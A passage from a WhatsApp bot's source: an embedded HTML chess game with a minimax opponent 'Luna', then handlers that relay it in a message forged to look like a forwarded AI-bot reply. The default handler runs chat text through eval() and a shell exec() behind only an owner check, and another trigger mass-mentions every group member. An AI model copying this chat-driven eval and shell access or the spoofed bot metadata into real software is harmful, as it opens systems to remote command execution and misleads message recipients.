    <p id="resultText">
      White wins.
    </p>

    <div class="modeButtons">
      <button class="modeBtn" data-mode="easy">
        <strong>🟢 Easy</strong>
        <small>Santai</small>
      </button>

      <button class="modeBtn" data-mode="Medium">
        <strong>🔵 Medium</strong>
        <small>Normal</small>
      </button>

      <button class="modeBtn" data-mode="hard">
        <strong>🟣 Hard</strong>
        <small>Sulit</small>
      </button>

      <button class="modeBtn" data-mode="master">
        <strong>🔴 Master</strong>
        <small>Serius 😭</small>
      </button>

      <button class="modeBtn" data-mode="pvp">
        <strong>👥 2 Player</strong>
        <small>Teman vs teman</small>
      </button>

      <button class="modeBtn" id="playAgain">
        <strong>♻️ Rematch</strong>
        <small>Main lagi</small>
      </button>
    </div>

  </div>
</div>

<div class="promotion" id="promotion">
  <div class="promoBox">
    <h3>Promote Pion 👑</h3>

    <div class="promoChoices">
      <button class="promo" data-piece="q">♕</button>
      <button class="promo" data-piece="r">♖</button>
      <button class="promo" data-piece="b">♗</button>
      <button class="promo" data-piece="n">♘</button>
    </div>
  </div>
</div>

<script>
'use strict';

/* =========================================================
 * AUDIO & VOICE SYSTEM (NEW)
 * ========================================================= */
let audioCtx = null;

function initAudio() {
  if (!audioCtx) {
    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
  }
  if (audioCtx.state === 'suspended') {
    audioCtx.resume();
  }
}

function playSound(type) {
  try {
    initAudio();
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    
    const now = audioCtx.currentTime;
    
    if (type === 'move') {
      // Suara jalan "tak" ringan
      osc.type = 'sine';
      osc.frequency.setValueAtTime(600, now);
      osc.frequency.exponentialRampToValueAtTime(800, now + 0.1);
      gain.gain.setValueAtTime(0.2, now);
      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.1);
      osc.start(now);
      osc.stop(now + 0.1);
    } else if (type === 'capture') {
      // Suara makan bidak lebih berat
      osc.type = 'square';
      osc.frequency.setValueAtTime(300, now);
      osc.frequency.exponentialRampToValueAtTime(100, now + 0.15);
      gain.gain.setValueAtTime(0.2, now);
      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.15);
      osc.start(now);
      osc.stop(now + 0.15);
    }
  } catch (e) {
    console.error("Audio error", e);
  }
}

function speakLuna(text) {
  try {
    if ('speechSynthesis' in window) {
      window.speechSynthesis.cancel(); // Hentikan omongan sebelumnya
      const utterance = new SpeechSynthesisUtterance(text);
      utterance.lang = 'id-ID';
      utterance.pitch = 1.4; 
      utterance.rate = 1.1; 
      window.speechSynthesis.speak(utterance);
    }
  } catch(e) {}
}

/* =========================================================
 * CONSTANTS
 * ========================================================= */

const WHITE = 'w';
const BLACK = 'b';

const PIECES = {
  w: {
    k:'♔',
    q:'♕',
    r:'♖',
    b:'♗',
    n:'♘',
    p:'♙'
  },
  b: {
    k:'♚',
    q:'♛',
    r:'♜',
    b:'♝',
    n:'♞',
    p:'♟'
  }
};

const VALUE = {
  p:100,
  n:320,
  b:330,
  r:500,
  q:900,
  k:20000
};

const FILES = ['a','b','c','d','e','f','g','h'];

/* =========================================================
 * ELEMENTS
 * ========================================================= */

const boardEl = document.getElementById('board');
const modeEl = document.getElementById('mode');
const statusEl = document.getElementById('status');
const turnText = document.getElementById('turnText');
const moveText = document.getElementById('moveText');
const modeText = document.getElementById('modeText');
const messageEl = document.getElementById('message');
const capturedEl = document.getElementById('captured');

const overlay = document.getElementById('overlay');
const resultIcon = document.getElementById('resultIcon');
const resultTitle = document.getElementById('resultTitle');
const resultText = document.getElementById('resultText');

const promotionEl = document.getElementById('promotion');

/* =========================================================
 * GAME STATE
 * ========================================================= */

let board = [];
let turn = WHITE;

let selected = null;
let legalSelected = [];

let history = [];

let flipped = false;

let gameOver = false;
let thinking = false;

let pendingPromotion = null;

let castle = {
  w: { k:true, q:true },
  b: { k:true, q:true }
};

let enPassant = null;

let halfmove = 0;
let fullmove = 1;

let captured = {
  w:[],
  b:[]
};

let mode = 'medium';

/* =========================================================
 * HELPERS
 * ========================================================= */

function cloneBoard(b){
  return b.map(row => row.map(p => p ? {...p} : null));
}

function cloneState(){
  return {
    board: cloneBoard(board),
    turn,
    castle: JSON.parse(JSON.stringify(castle)),
    enPassant: enPassant ? {...enPassant} : null,
    halfmove,
    fullmove,
    captured:{
      w:[...captured.w],
      b:[...captured.b]
    }
  };
}

function restoreState(s){
  board = cloneBoard(s.board);
  turn = s.turn;
  castle = JSON.parse(JSON.stringify(s.castle));
  enPassant = s.enPassant ? {...s.enPassant} : null;
  halfmove = s.halfmove;
  fullmove = s.fullmove;

  captured = {
    w:[...s.captured.w],
    b:[...s.captured.b]
  };

  selected = null;
  legalSelected = [];
}

function inside(r,c){
  return r >= 0 && r < 8 && c >= 0 && c < 8;
}

function opposite(color){
  return color === WHITE ? BLACK : WHITE;
}

function pieceAt(r,c){
  if(!inside(r,c)) return null;
  return board[r][c];
}

function makePiece(color,type){
  return {color,type};
}

function squareName(r,c){
  return FILES[c] + (8-r);
}

function randomChoice(arr){
  return arr[Math.floor(Math.random()*arr.length)];
}

/* =========================================================
 * INITIAL POSITION
 * ========================================================= */

function createInitialBoard(){
  const b = Array.from({length:8},()=>Array(8).fill(null));

  const back = ['r','n','b','q','k','b','n','r'];

  for(let c=0;c<8;c++){
    b[0][c] = makePiece(BLACK,back[c]);
    b[1][c] = makePiece(BLACK,'p');

    b[6][c] = makePiece(WHITE,'p');
    b[7][c] = makePiece(WHITE,back[c]);
  }

  return b;
}

/* =========================================================
 * ATTACK DETECTION
 * ========================================================= */

function isSquareAttacked(b,r,c,byColor){

  // pawns
  const pawnDir = byColor === WHITE ? 1 : -1;

  for(const dc of [-1,1]){
    const rr = r + pawnDir;
    const cc = c + dc;

    if(inside(rr,cc)){
      const p = b[rr][cc];

      if(
        p &&
        p.color === byColor &&
        p.type === 'p'
      ){
        return true;
      }
    }
  }

  // knights
  const knightMoves = [
    [-2,-1],[-2,1],
    [-1,-2],[-1,2],
    [1,-2],[1,2],
    [2,-1],[2,1]
  ];

  for(const [dr,dc] of knightMoves){
    const p = pieceAtBoard(b,r+dr,c+dc);

    if(
      p &&
      p.color === byColor &&
      p.type === 'n'
    ){
      return true;
    }
  }

  // king
  for(let dr=-1;dr<=1;dr++){
    for(let dc=-1;dc<=1;dc++){

      if(!dr && !dc) continue;

      const p = pieceAtBoard(b,r+dr,c+dc);

      if(
        p &&
        p.color === byColor &&
        p.type === 'k'
      ){
        return true;
      }
    }
  }

  // bishop / queen diagonals
  const diagonals = [
    [-1,-1],[-1,1],
    [1,-1],[1,1]
  ];

  for(const [dr,dc] of diagonals){

    let rr = r + dr;
    let cc = c + dc;

    while(inside(rr,cc)){

      const p = pieceAtBoard(b,rr,cc);

      if(p){

        if(
          p.color === byColor &&
          (p.type === 'b' || p.type === 'q')
        ){
          return true;
        }

        break;
      }

      rr += dr;
      cc += dc;
    }
  }

  // rook / queen
  const straight = [
    [-1,0],[1,0],
    [0,-1],[0,1]
  ];

  for(const [dr,dc] of straight){

    let rr = r + dr;
    let cc = c + dc;

    while(inside(rr,cc)){

      const p = pieceAtBoard(b,rr,cc);

      if(p){

        if(
          p.color === byColor &&
          (p.type === 'r' || p.type === 'q')
        ){
          return true;
        }

        break;
      }

      rr += dr;
      cc += dc;
    }
  }

  return false;
}

function pieceAtBoard(b,r,c){
  if(!inside(r,c)) return null;
  return b[r][c];
}

function findKing(b,color){

  for(let r=0;r<8;r++){
    for(let c=0;c<8;c++){

      const p = b[r][c];

      if(
        p &&
        p.color === color &&
        p.type === 'k'
      ){
        return {r,c};
      }
    }
  }

  return null;
}

function inCheck(b,color){

  const king = findKing(b,color);

  if(!king) return true;

  return isSquareAttacked(
    b,
    king.r,
    king.c,
    opposite(color)
  );
}

/* =========================================================
 * MOVE GENERATION
 * ========================================================= */

function pseudoMoves(b,r,c,stateTurn){

  const p = b[r][c];

  if(!p || p.color !== stateTurn) return [];

  const moves = [];

  function add(rr,cc,extra={}){
    if(!inside(rr,cc)) return;

    const target = b[rr][cc];

    if(target && target.color === p.color) return;

    moves.push({
      from:{r,c},
      to:{r:rr,c:cc},
      ...extra
    });
  }

  if(p.type === 'p'){

    const dir = p.color === WHITE ? -1 : 1;
    const start = p.color === WHITE ? 6 : 1;

    if(
      inside(r+dir,c) &&
      !b[r+dir][c]
    ){

      add(r+dir,c);

      if(
        r === start &&
        !b[r+dir*2][c]
      ){
        add(r+dir*2,c,{doublePawn:true});
      }
    }

    for(const dc of [-1,1]){

      const rr = r + dir;
      const cc = c + dc;

      if(!inside(rr,cc)) continue;

      const target = b[rr][cc];

      if(
        target &&
        target.color !== p.color
      ){
        add(rr,cc,{capture:true});
      }

      if(
        enPassant &&
        enPassant.r === rr &&
        enPassant.c === cc
      ){
        add(rr,cc,{enPassant:true,capture:true});
      }
    }

  }

  if(p.type === 'n'){

    const jumps = [
      [-2,-1],[-2,1],
      [-1,-2],[-1,2],
      [1,-2],[1,2],
      [2,-1],[2,1]
    ];

    for(const [dr,dc] of jumps){
      add(r+dr,c+dc);
    }
  }

  if(
    p.type === 'b' ||
    p.type === 'r' ||
    p.type === 'q'
  ){

    const dirs = [];

    if(p.type === 'b' || p.type === 'q'){
      dirs.push(
        [-1,-1],[-1,1],
        [1,-1],[1,1]
      );
    }

    if(p.type === 'r' || p.type === 'q'){
      dirs.push(
        [-1,0],[1,0],
        [0,-1],[0,1]
      );
    }

    for(const [dr,dc] of dirs){

      let rr = r + dr;
      let cc = c + dc;

      while(inside(rr,cc)){

        const target = b[rr][cc];

        if(!target){
          add(rr,cc);
        }else{

          if(target.color !== p.color){
            add(rr,cc,{capture:true});
          }

          break;
        }

        rr += dr;
        cc += dc;
      }
    }
  }

  if(p.type === 'k'){

    for(let dr=-1;dr<=1;dr++){
      for(let dc=-1;dc<=1;dc++){

        if(!dr && !dc) continue;

        add(r+dr,c+dc);
      }
    }

    // castling
    const rights = castle[p.color];

    if(
      rights &&
      !inCheck(b,p.color)
    ){

      // king side
      if(
        rights.k &&
        !b[r][5] &&
        !b[r][6] &&
        b[r][7] &&
        b[r][7].type === 'r' &&
        b[r][7].color === p.color &&
        !isSquareAttacked(b,r,5,opposite(p.color)) &&
        !isSquareAttacked(b,r,6,opposite(p.color))
      ){
        moves.push({
          from:{r,c},
          to:{r,c:6},
          castle:'k'
        });
      }

      // queen side
      if(
        rights.q &&
        !b[r][1] &&
        !b[r][2] &&
        !b[r][3] &&
        b[r][0] &&
        b[r][0].type === 'r' &&
        b[r][0].color === p.color &&
        !isSquareAttacked(b,r,3,opposite(p.color)) &&
        !isSquareAttacked(b,r,2,opposite(p.color))
      ){
        moves.push({
          from:{r,c},
          to:{r,c:2},
          castle:'q'
        });
      }
    }
  }

  return moves;
}

function applyMoveToBoard(b,move,promotion='q'){

  const next = cloneBoard(b);

  const p = next[move.from.r][move.from.c];

  if(!p) return next;

  let capturedPiece = next[move.to.r][move.to.c];

  next[move.from.r][move.from.c] = null;

  // en passant
  if(move.enPassant){

    const dir = p.color === WHITE ? 1 : -1;
    const rr = move.to.r + dir;

    capturedPiece = next[rr][move.to.c];

    next[rr][move.to.c] = null;
  }

  next[move.to.r][move.to.c] = {...p};

  // promotion
  if(
    p.type === 'p' &&
    (move.to.r === 0 || move.to.r === 7)
  ){
    next[move.to.r][move.to.c].type =
      promotion || 'q';
  }

  // castling rook
  if(move.castle === 'k'){

    next[move.from.r][5] =
      next[move.from.r][7];

    next[move.from.r][7] = null;
  }

  if(move.castle === 'q'){

    next[move.from.r][3] =
      next[move.from.r][0];

    next[move.from.r][0] = null;
  }

  return next;
}

function legalMovesForPiece(b,r,c,color){

  const pseudo = pseudoMoves(b,r,c,color);
  const legal = [];

  for(const move of pseudo){

    const next = applyMoveToBoard(b,move,'q');

    if(!inCheck(next,color)){
      legal.push(move);
    }
  }

  return legal;
}

function allLegalMoves(b,color){

  const result = [];

  for(let r=0;r<8;r++){
    for(let c=0;c<8;c++){

      const p = b[r][c];

      if(
        p &&
        p.color === color
      ){
        result.push(
          ...legalMovesForPiece(b,r,c,color)
        );
      }
    }
  }

  return result;
}

/* =========================================================
 * REAL MOVE
 * ========================================================= */

function executeMove(move,promotion='q',save=true){

  if(gameOver) return;
  initAudio(); // Initialize audio on first move

  const before = cloneState();

  const moving = board[move.from.r][move.from.c];
  let capturedPiece = board[move.to.r][move.to.c];

  if(move.enPassant){

    const dir = moving.color === WHITE ? 1 : -1;

    capturedPiece =
      board[move.to.r + dir][move.to.c];
  }

  board = applyMoveToBoard(
    board,
    move,
    promotion
  );

  if(capturedPiece){
    captured[ moving.color ].push(capturedPiece);
    playSound('capture'); // Bunyi makan bidak
  } else {
    playSound('move'); // Bunyi bidak jalan biasa
  }

  // castling rights
  if(moving.type === 'k'){
    castle[moving.color].k = false;
    castle[moving.color].q = false;
  }

  if(moving.type === 'r'){

    if(moving.color === WHITE){

      if(move.from.r === 7 && move.from.c === 0)
        castle.w.q = false;

      if(move.from.r === 7 && move.from.c === 7)
        castle.w.k = false;

    }else{

      if(move.from.r === 0 && move.from.c === 0)
        castle.b.q = false;

      if(move.from.r === 0 && move.from.c === 7)
        castle.b.k = false;
    }
  }

  // rook captured
  if(capturedPiece && capturedPiece.type === 'r'){

    if(move.to.r === 7 && move.to.c === 0)
      castle.w.q = false;

    if(move.to.r === 7 && move.to.c === 7)
      castle.w.k = false;

    if(move.to.r === 0 && move.to.c === 0)
      castle.b.q = false;

    if(move.to.r === 0 && move.to.c === 7)
      castle.b.k = false;
  }

  // en passant target
  enPassant = null;

  if(
    moving.type === 'p' &&
    Math.abs(move.to.r - move.from.r) === 2
  ){
    enPassant = {
      r:(move.to.r + move.from.r) / 2,
      c:move.from.c
    };
  }

  if(moving.type === 'p' || capturedPiece){
    halfmove = 0;
  }else{
    halfmove++;
  }

  if(moving.color === BLACK){
    fullmove++;
  }

  if(save){
    history.push(before);
  }

  turn = opposite(turn);

  selected = null;
  legalSelected = [];

  render();

  checkGameState();

  if(
    !gameOver &&
    mode !== 'pvp' &&
    turn === BLACK
  ){
    aiMove();
  }
}

/* =========================================================
 * PLAYER INPUT
 * ========================================================= */

function selectSquare(r,c){

  if(gameOver || thinking) return;

  if(
    mode !== 'pvp' &&
    turn === BLACK
  ){
    return;
  }

  const p = board[r][c];

  if(selected){

    const move = legalSelected.find(
      m => m.to.r === r && m.to.c === c
    );

    if(move){

      if(
        p &&
        p.type === 'k' &&
        false
      ){}

      const moving =
        board[move.from.r][move.from.c];

      if(
        moving.type === 'p' &&
        (move.to.r === 0 || move.to.r === 7)
      ){

        pendingPromotion = move;
        promotionEl.classList.add('show');
        return;
      }

      executeMove(move);
      return;
    }

    if(
      p &&
      p.color === turn
    ){
      selected = {r,c};
      legalSelected =
        legalMovesForPiece(board,r,c,turn);
      render();
      return;
    }

    selected = null;
    legalSelected = [];
    render();
    return;
  }

  if(
    p &&
    p.color === turn
  ){
    selected = {r,c};

    legalSelected =
      legalMovesForPiece(board,r,c,turn);

    render();
  }
}

/* =========================================================
 * CHECK GAME STATE
 * ========================================================= */

function checkGameState(){

  const moves = allLegalMoves(board,turn);
  const check = inCheck(board,turn);

  if(moves.length === 0){

    gameOver = true;

    if(check){

      const winner =
        opposite(turn) === WHITE
          ? 'White'
          : 'Black';

      // Suara menang / kalah dari Luna
      if (mode !== 'pvp') {
        if (winner === 'White') {
          speakLuna('Ughh... kamu menang. Hebat juga ya.');
        } else {
          speakLuna('Yeyyy! Luna menang! Kamu kalah mampus!');
        }
      } else {
        speakLuna('Skak mat! ' + winner + ' menang!');
      }

      showResult(
        '👑',
        'Checkmate!',
        winner + ' menang!'
      );

    }else{
      speakLuna('Heeeh... permainannya seri nih.');
      showResult(
        '🤝',
        'Stalemate',
        'Permainan berakhir remis.'
      );
    }

    return;
  }

  if(halfmove >= 100){

    gameOver = true;
    speakLuna('Lama banget mainnya, seri aja deh!');
    showResult(
      '🤝',
      'Draw',
      '50-move rule.'
    );

    return;
  }

  if (check) {
    speakLuna('Skak! Hati-hati!');
  }

  const status =
    check
      ? '⚠️ CHECK!'
      : turn === WHITE
        ? 'White turn'
        : 'Black turn';

  statusEl.textContent = status;

  messageEl.textContent =
    check
      ? '⚠️ Raja sedang dalam bahaya!'
      : turn === WHITE
        ? 'Giliran kamu ♟️'
        : mode === 'pvp'
          ? 'Giliran Black ♟️'
          : 'Luna sedang berpikir... 🧠';

  turnText.textContent =
    turn === WHITE ? 'White' : 'Black';
}

/* =========================================================
 * AI
 * ========================================================= */

function getDepth(){

  if(mode === 'easy') return 1;
  if(mode === 'medium') return 2;
  if(mode === 'hard') return 3;

  return 4;
}

function evaluateBoard(b){

  let score = 0;

  for(let r=0;r<8;r++){
    for(let c=0;c<8;c++){

      const p = b[r][c];

      if(!p) continue;

      let value = VALUE[p.type];

      // positional bonus
      const centerDist =
        Math.abs(3.5-r) +
        Math.abs(3.5-c);

      if(p.type === 'p'){
        value +=
          (p.color === WHITE
            ? 6-r
            : r-1) * 8;
      }

      if(
        p.type === 'n' ||
        p.type === 'b'
      ){
        value += Math.max(
          0,
          20 - centerDist * 5
        );
      }

      if(p.type === 'q'){
        value += Math.max(
          0,
          12 - centerDist * 2
        );
      }

      score +=
        p.color === WHITE
          ? value
          : -value;
    }
  }

  // king safety
  if(inCheck(b,WHITE))
    score -= 45;

  if(inCheck(b,BLACK))
    score += 45;

  return score;
}

function moveOrderScore(b,move){

  const attacker =
    b[move.from.r][move.from.c];

  let score = 0;

  if(move.capture){

    let victim =
      b[move.to.r][move.to.c];

    if(move.enPassant){
      victim = {type:'p'};
    }

    if(victim){
      score +=
        VALUE[victim.type] * 10 -
        VALUE[attacker.type];
    }
  }

  if(move.castle)
    score += 40;

  if(attacker.type === 'p'){
    if(move.to.r === 0 || move.to.r === 7)
      score += 800;
  }

  return score;
}

function orderedMoves(b,color){

  const moves = allLegalMoves(b,color);

  moves.sort(
    (a,z) =>
      moveOrderScore(b,z) -
      moveOrderScore(b,a)
  );

  return moves;
}

function minimax(b,color,depth,alpha,beta){

  const moves = orderedMoves(b,color);

  if(depth === 0){
    return evaluateBoard(b);
  }

  if(moves.length === 0){

    if(inCheck(b,color)){

      return color === WHITE
        ? -999999
        : 999999;
    }

    return 0;
  }

  if(color === WHITE){

    let best = -Infinity;

    for(const move of moves){

      const next =
        applyMoveToBoard(b,move,'q');

      const value =
        minimax(
          next,
          BLACK,
          depth-1,
          alpha,
          beta
        );

      best = Math.max(best,value);
      alpha = Math.max(alpha,value);

      if(beta <= alpha) break;
    }

    return best;

  }else{

    let best = Infinity;

    for(const move of moves){

      const next =
        applyMoveToBoard(b,move,'q');

      const value =
        minimax(
          next,
          WHITE,
          depth-1,
          alpha,
          beta
        );

      best = Math.min(best,value);
      beta = Math.min(beta,value);

      if(beta <= alpha) break;
    }

    return best;
  }
}

function chooseAIMove(){

  const moves =
    orderedMoves(board,BLACK);

  if(!moves.length) return null;

  // EASY:
  // intentionally imperfect
  if(mode === 'easy'){

    const scored = moves.map(move => {

      const next =
        applyMoveToBoard(board,move,'q');

      let score =
        evaluateBoard(next);

      score +=
        (Math.random()-.5) * 500;

      return {move,score};
    });

    scored.sort(
      (a,b) => a.score-b.score
    );

    const pool =
      scored.slice(
        0,
        Math.min(5,scored.length)
      );

    return randomChoice(pool).move;
  }

  const depth = getDepth();

  let bestMove = moves[0];
  let bestScore = Infinity;

  for(const move of moves){

    const next =
      applyMoveToBoard(board,move,'q');

    let score =
      minimax(
        next,
        WHITE,
        depth-1,
        -Infinity,
        Infinity
      );

    // Master gets additional tactical preference
    if(mode === 'master'){

      if(move.capture){
        score -=
          VALUE[
            board[move.to.r][move.to.c]?.type || 'p'
          ] * .02;
      }

      if(move.castle){
        score -= 15;
      }
    }

    if(score < bestScore){

      bestScore = score;
      bestMove = move;

    }else if(
      Math.abs(score-bestScore) < 15 &&
      Math.random() < .22
    ){
      bestMove = move;
    }
  }

  return bestMove;
}

function aiMove(){

  if(
    gameOver ||
    mode === 'pvp' ||
    turn !== BLACK
  ) return;

  thinking = true;
  statusEl.textContent = '🧠 Luna thinking...';
  messageEl.textContent =
    'Luna lagi mikir langkah terbaik... ehehe 🧠✨';

  setTimeout(()=>{

    const move = chooseAIMove();

    thinking = false;

    if(move){
      executeMove(move);
    }

  }, mode === 'master' ? 100 : 70);
}

/* =========================================================
 * RENDER BOARD
 * ========================================================= */

function render(){

  boardEl.innerHTML = '';

  for(let displayR=0;displayR<8;displayR++){

    for(let displayC=0;displayC<8;displayC++){

      const r =
        flipped ? 7-displayR : displayR;

      const c =
        flipped ? 7-displayC : displayC;

      const el =
        document.createElement('div');

      el.className =
        'square ' +
        ((r+c)%2===0 ? 'light' : 'dark');

      if(
        selected &&
        selected.r === r &&
        selected.c === c
      ){
        el.classList.add('selected');
      }

      const king =
        board[r][c];

      if(
        king &&
        king.type === 'k' &&
        king.color === turn &&
        inCheck(board,turn)
      ){
        el.classList.add('check');
      }

      const move =
        legalSelected.find(
          m => m.to.r === r && m.to.c === c
        );

      if(move){

        if(
          board[r][c] ||
          move.enPassant
        ){

          const ring =
            document.createElement('div');

          ring.className = 'captureRing';

          el.appendChild(ring);

        }else{

          const dot =
            document.createElement('div');

          dot.className = 'moveDot';

          el.appendChild(dot);
        }
      }

      if(board[r][c]){

        const piece =
          document.createElement('div');

        piece.className = 'piece ' + board[r][c].color;

        piece.textContent =
          PIECES[
            board[r][c].color
          ][
            board[r][c].type
          ];

        el.appendChild(piece);
      }

      // coordinates
      if(displayC === 7){

        const coord =
          document.createElement('span');

        coord.className =
          'coord file';

        coord.textContent =
          FILES[c];

        el.appendChild(coord);
      }

      if(displayR === 0){

        const coord =
          document.createElement('span');

        coord.className =
          'coord rank';

        coord.textContent =
          8-r;

        el.appendChild(coord);
      }

      el.addEventListener(
        'pointerdown',
        e=>{
          e.preventDefault();
          selectSquare(r,c);
        }
      );

      boardEl.appendChild(el);
    }
  }

  turnText.textContent =
    turn === WHITE ? 'White' : 'Black';

  moveText.textContent =
    history.length;

  modeText.textContent =
    mode === 'pvp'
      ? '2 Player'
      : mode.charAt(0).toUpperCase() +
        mode.slice(1);

  capturedEl.textContent =
    '⚪ ' +
    captured.w
      .map(p=>PIECES[p.color][p.type])
      .join(' ') +
    '    ⚫ ' +
    captured.b
      .map(p=>PIECES[p.color][p.type])
      .join(' ');

  if(!gameOver){

    if(turn === BLACK && mode !== 'pvp'){
      statusEl.textContent =
        thinking
          ? '🧠 Thinking...'
          : 'Black';
    }else{
      statusEl.textContent =
        turn === WHITE
          ? 'White turn'
          : 'Black turn';
    }
  }
}

/* =========================================================
 * NEW GAME
 * ========================================================= */

function resetGame(){

  board = createInitialBoard();

  turn = WHITE;

  selected = null;
  legalSelected = [];

  history = [];

  gameOver = false;
  thinking = false;

  pendingPromotion = null;

  castle = {
    w:{k:true,q:true},
    b:{k:true,q:true}
  };

  enPassant = null;

  halfmove = 0;
  fullmove = 1;

  captured = {
    w:[],
    b:[]
  };

  overlay.classList.remove('show');
  promotionEl.classList.remove('show');

  messageEl.textContent =
    mode === 'pvp'
      ? 'White mulai dulu ♙'
      : 'White mulai dulu. Ayo kalahkan Luna 😏';

  render();
}

function showResult(icon,title,text){

  resultIcon.textContent = icon;
  resultTitle.textContent = title;
  resultText.textContent = text;

  setTimeout(()=>{
    overlay.classList.add('show');
  },200);
}

/* =========================================================
 * UNDO
 * ========================================================= */

function undo(){

  if(!history.length || thinking) return;

  if(
    mode !== 'pvp' &&
    turn === WHITE &&
    history.length >= 2
  ){
    history.pop();
    const state = history.pop();

    restoreState(state);
  }else{

    const state = history.pop();

    restoreState(state);
  }

  gameOver = false;

  overlay.classList.remove('show');

  render();

  checkGameState();
}

/* =========================================================
 * PROMOTION
 * ========================================================= */

document
  .querySelectorAll('.promo')
  .forEach(btn=>{

    btn.addEventListener('click',()=>{

      if(!pendingPromotion) return;

      const type =
        btn.dataset.piece;

      const move =
        pendingPromotion;

      pendingPromotion = null;

      promotionEl.classList.remove('show');

      executeMove(move,type);
    });
  });

/* =========================================================
 * CONTROLS
 * ========================================================= */

document
  .getElementById('newGame')
  .addEventListener('click', ()=>{
    resetGame();
  });

document
  .getElementById('undo')
  .addEventListener('click',undo);

document
  .getElementById('flip')
  .addEventListener('click',()=>{

    flipped = !flipped;

    render();
  });

document
  .getElementById('resign')
  .addEventListener('click',()=>{

    if(gameOver) return;

    gameOver = true;
    speakLuna('Huuu, cemen! Masa nyerah sih!');

    showResult(
      '🏳️',
      'Resign',
      turn === WHITE
        ? 'White menyerah. Black menang.'
        : 'Black menyerah. White menang.'
    );
  });

modeEl.addEventListener(
  'change',
  ()=>{

    mode = modeEl.value;

    resetGame();
  }
);

document
  .querySelectorAll('.modeBtn[data-mode]')
  .forEach(btn=>{

    btn.addEventListener('click',()=>{

      mode = btn.dataset.mode;

      modeEl.value = mode;

      resetGame();
    });
  });

document
  .getElementById('playAgain')
  .addEventListener(
    'click',
    resetGame
  );

/* =========================================================
 * KEYBOARD
 * ========================================================= */

document.addEventListener(
  'keydown',
  e=>{

    if(e.key === 'Escape'){

      selected = null;
      legalSelected = [];

      render();
    }

    if(
      e.key.toLowerCase() === 'r'
    ){
      resetGame();
    }

    if(
      e.key.toLowerCase() === 'u'
    ){
      undo();
    }
  }
);

/* =========================================================
 * START
 * ========================================================= */

mode = 'hard';
modeEl.value = mode;

resetGame();

</script>

</body>
</html>
`;

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: HTML,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
);
}
break

// end
default:
if (budy.startsWith('=>')) {
if (!isOwner) return reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}



if (m.text.toLowerCase() == "bot") {
    let groupMetadata = await luna.groupMetadata(m.chat).catch(e => null)
    let member = groupMetadata.participants.map(u => u.id)
    luna.relayMessage(m.chat, {
        extendedTextMessage: {
            text: "*Luna-MD*",
            contextInfo: {
                mentionedJid: member,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: `${global.namaSaluran}`,
                    newsletterJid: `${global.idSaluran}`,
                    serverMessageId: 143
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: luna.decodeJid(luna.user.id)
                },
                externalAdReply: {
                    automatedGreetingMessageShown: true,
                    greetingMessageBody: "Luna-MD on",
                    thumbnail: thumb,
                    title: `${m.pushName}`,
                    body: `${m.pushName}`,
                    mediaType: 1,
                    containsAutoReply: true 
                }
            }
        }
    }, {})
}



if (budy.startsWith('>')) {
if (!isOwner) return reply(mess.owner)
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}



if (budy.startsWith('$')) {
if (!isOwner) return reply(mess.owner)
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}


}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
luna.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error pada command :* ${isCmd ? prefix+command : m.text}

*Detail informasi error :*
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}


